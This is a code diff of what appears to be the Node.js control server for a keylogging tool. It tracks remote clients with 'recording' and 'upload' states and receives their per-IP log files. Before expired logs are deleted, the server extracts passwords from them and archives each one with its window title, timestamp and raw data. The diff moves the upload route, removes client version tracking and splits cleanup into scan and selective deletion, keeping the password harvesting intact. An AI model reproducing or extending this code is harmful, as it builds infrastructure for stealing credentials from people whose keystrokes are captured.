@@ -333,19 +333,6 @@ app.get('/logout', (req, res) => {
     res.redirect('/login');
 });
 
-app.post('/api/upload/:ip', express.raw({ type: 'text/plain', limit: CONFIG.uploadSizeLimit }), asyncHandler(async (req, res) => {
-    const ip = req.params.ip;
-    let clientId = Array.from(clientManager.clients.keys()).find(id => id.startsWith(ip));
-    if (!clientId) clientId = Array.from(clientManager.knownClients.keys()).find(id => id.startsWith(ip));
-    const client = clientManager.clients.get(clientId);
-    const logDir = client ? client.logDir : alistClient.basePath;
-    const filename = `${ip}_${new Date().toISOString().slice(0, 10).replace(/-/g, '')}.log`;
-
-    await alistClient.uploadFile(logDir, filename, req.body.toString());
-    logger.info(`文件上传成功: ${filename}`, { ip, size: req.body.length });
-    res.json({ success: true, message: '文件上传成功' });
-}));
-
 app.use(authMiddleware);
 
 function userMiddleware(req, res, next) {
@@ -907,8 +894,7 @@ class ClientManager {
                 uploadEnabled: false,
                 lastSeen: new Date(),
                 logDir: alistClient.basePath,
-                shouldReconnect: false,
-                version: null
+                shouldReconnect: false
             };
 
             const existing = this.clients.get(clientId);
@@ -997,9 +983,6 @@ class ClientManager {
         }
         if (response.data.upload_enabled !== undefined) {
             client.uploadEnabled = response.data.upload_enabled;
-        }
-        if (response.data.version !== undefined) {
-            client.version = response.data.version;
         }
     }
 
@@ -1127,23 +1110,8 @@ class ClientManager {
             status: client.status,
             recording: client.recording,
             uploadEnabled: client.uploadEnabled,
-            lastSeen: client.lastSeen,
-            version: client.version
+            lastSeen: client.lastSeen
         };
-    }
-
-    updateClientVersion(ip, port, version) {
-        const clientId = `${ip}:${port}`;
-        const client = this.clients.get(clientId);
-        if (client) {
-            client.version = version;
-            client.lastSeen = new Date();
-            this.broadcastClientUpdate(client, 'updated');
-            this.logger.info(`客户端 ${clientId} 版本已更新为 ${version}`);
-            return true;
-        }
-        this.logger.warn(`尝试更新不存在的客户端版本: ${clientId}`);
-        return false;
     }
 
     getAllClients() {
@@ -1368,8 +1336,7 @@ class ClientManager {
                                         uploadEnabled: false,
                                         lastSeen: now,
                                         logDir: alistClient.basePath,
-                                        shouldReconnect: false,
-                                        version: null
+                                        shouldReconnect: false
                                     };
                                     this.clients.set(clientId, client);
                                     this.knownClients.set(clientId, { ip: cleanIp, port, lastSeen: now });
@@ -1544,35 +1511,21 @@ function handleWebSocketConnection(ws, req) {
 }
 
 //自动清理过期日志文件 
-async function cleanExpiredLogs() {
+
+
+// 扫描过期日志文件（不删除，仅列出）
+async function scanExpiredLogs() {
     const now = Date.now();
     const retentionMs = CONFIG.logRetentionDays * 24 * 60 * 60 * 1000;
-    let cleanedCount = 0;
-    let savedPasswordsCount = 0; // 改名为保存的密码条数
+    const expiredFiles = [];
 
     try {
-        let allFiles;
-        try {
-            allFiles = await alistClient.listFiles(CONFIG.alist.basePath, true);
-        } catch (err) {
-            logger.error(`[日志清理] 无法列出文件: ${err.message}`);
-            return;
-        }
-
+        const allFiles = await alistClient.listFiles(CONFIG.alist.basePath, true);
         const logFiles = allFiles.filter(f => f.filename.endsWith('.log'));
-        if (logFiles.length === 0) {
-            logger.debug('[日志清理] 没有 .log 文件需要检查');
-            return;
-        }
-
-        logger.info(`[日志清理] 开始检查 ${logFiles.length} 个日志文件，保留 ${CONFIG.logRetentionDays} 天`);
 
         for (const file of logFiles) {
             const dateMatch = file.filename.match(/(\d{8})\.log$/);
-            if (!dateMatch) {
-                logger.debug(`[日志清理] 跳过无法识别日期的文件: ${file.filename}`);
-                continue;
-            }
+            if (!dateMatch) continue;
 
             const dateStr = dateMatch[1];
             const year = parseInt(dateStr.substring(0, 4));
@@ -1581,58 +1534,24 @@ async function cleanExpiredLogs() {
             const fileDate = new Date(year, month, day);
             const fileAge = now - fileDate.getTime();
 
-            if (fileAge <= retentionMs) continue;
-
-            const filePath = `${CONFIG.alist.basePath}/${file.filename}`;
-            logger.info(`[日志清理] 发现过期文件: ${file.filename} (日期: ${dateStr})`);
-
-            try {
-                // 1. 读取文件内容
-                const content = await alistClient.readFile(filePath);
-
-                // 2. 使用现有的密码提取逻辑，而不是简单过滤
-                const extractedPasswords = extractPasswordsFromLog(content, file.filename);
-
-                // 3. 如果有提取到密码，追加保存到归档文件
-                if (extractedPasswords.length > 0) {
-                    // 生成类似 extracted_passwords.txt 的格式化文本块
-                    let block = `\n--- ${file.filename} (deleted on ${new Date().toISOString()}) ---\n`;
-                    extractedPasswords.forEach((item, index) => {
-                        block += `${index + 1}. 来自: ${item.file}\n`;
-                        block += `窗口: ${item.window || '未知'}\n`;
-                        block += `时间: ${item.timestamp}\n`;
-                        block += `内容: ${item.password}\n`;
-                        block += `原始数据: ${item.rawPassword}\n\n`;
-                    });
-
-                    const dir = path.dirname(CONFIG.sensitiveLogSavePath);
-                    if (!fs.existsSync(dir)) {
-                        fs.mkdirSync(dir, { recursive: true });
-                    }
-                    await fs.promises.appendFile(CONFIG.sensitiveLogSavePath, block, 'utf8');
-                    savedPasswordsCount += extractedPasswords.length;
-                    logger.debug(`[日志清理] 从 ${file.filename} 提取并保存了 ${extractedPasswords.length} 条密码`);
-                }
-
-                // 4. 删除源文件
-                await alistClient.deleteFile(filePath);
-                cleanedCount++;
-                logger.info(`[日志清理] 已删除: ${file.filename}`);
-
-            } catch (err) {
-                logger.error(`[日志清理] 处理 ${file.filename} 时出错: ${err.message}`);
+            if (fileAge > retentionMs) {
+                expiredFiles.push({
+                    filename: file.filename,
+                    date: dateStr           // 格式 20260428，方便展示
+                });
             }
         }
 
-        logger.info(`[日志清理] 清理完成：删除 ${cleanedCount} 个文件，保存 ${savedPasswordsCount} 条密码`);
+        // 按日期降序排列，最新的在前
+        expiredFiles.sort((a, b) => b.date.localeCompare(a.date));
+        return expiredFiles;
     } catch (err) {
-        logger.error(`[日志清理] 全局异常: ${err.message}`);
+        logger.error(`[扫描过期日志] 失败: ${err.message}`);
+        throw err;
     }
 }
 
-
-// server.js -> cleanSelectedLogs 函数
-
+//清理选中的日志文件
 async function cleanSelectedLogs(filenames) {
     const results = [];
     let totalClean = 0, totalSaved = 0;
@@ -1675,44 +1594,6 @@ async function cleanSelectedLogs(filenames) {
 
     logger.info(`[清理选中] 完成：删除 ${totalClean} 个，保存 ${totalSaved} 条密码`);
     return { results, totalClean, totalSaved };
-}
-
-// 扫描过期日志文件（不删除，仅列出）
-async function scanExpiredLogs() {
-    const now = Date.now();
-    const retentionMs = CONFIG.logRetentionDays * 24 * 60 * 60 * 1000;
-    const expiredFiles = [];
-
-    try {
-        const allFiles = await alistClient.listFiles(CONFIG.alist.basePath, true);
-        const logFiles = allFiles.filter(f => f.filename.endsWith('.log'));
-
-        for (const file of logFiles) {
-            const dateMatch = file.filename.match(/(\d{8})\.log$/);
-            if (!dateMatch) continue;
-
-            const dateStr = dateMatch[1];
-            const year = parseInt(dateStr.substring(0, 4));
-            const month = parseInt(dateStr.substring(4, 6)) - 1;
-            const day = parseInt(dateStr.substring(6, 8));
-            const fileDate = new Date(year, month, day);
-            const fileAge = now - fileDate.getTime();
-
-            if (fileAge > retentionMs) {
-                expiredFiles.push({
-                    filename: file.filename,
-                    date: dateStr           // 格式 20260428，方便展示
-                });
-            }
-        }
-
-        // 按日期降序排列，最新的在前
-        expiredFiles.sort((a, b) => b.date.localeCompare(a.date));
-        return expiredFiles;
-    } catch (err) {
-        logger.error(`[扫描过期日志] 失败: ${err.message}`);
-        throw err;
-    }
 }
 
 // ========== HTTP API 路由 ==========
@@ -2185,7 +2066,18 @@ app.post('/api/clients/:clientId/logs/delete', asyncHandler(async (req, res) => 
     res.json({ success: true, message: '命令已发送' });
 }));
 
+app.post('/api/upload/:ip', express.raw({ type: 'text/plain', limit: CONFIG.uploadSizeLimit }), asyncHandler(async (req, res) => {
+    const ip = req.params.ip;
+    let clientId = Array.from(clientManager.clients.keys()).find(id => id.startsWith(ip));
+    if (!clientId) clientId = Array.from(clientManager.knownClients.keys()).find(id => id.startsWith(ip));
+    const client = clientManager.clients.get(clientId);
+    const logDir = client ? client.logDir : alistClient.basePath;
+    const filename = `${ip}_${new Date().toISOString().slice(0, 10).replace(/-/g, '')}.log`;
 
+    await alistClient.uploadFile(logDir, filename, req.body.toString());
+    logger.info(`文件上传成功: ${filename}`, { ip, size: req.body.length });
+    res.json({ success: true, message: '文件上传成功' });
+}));
 
 // ========== 密码提取核心函数 ==========
 
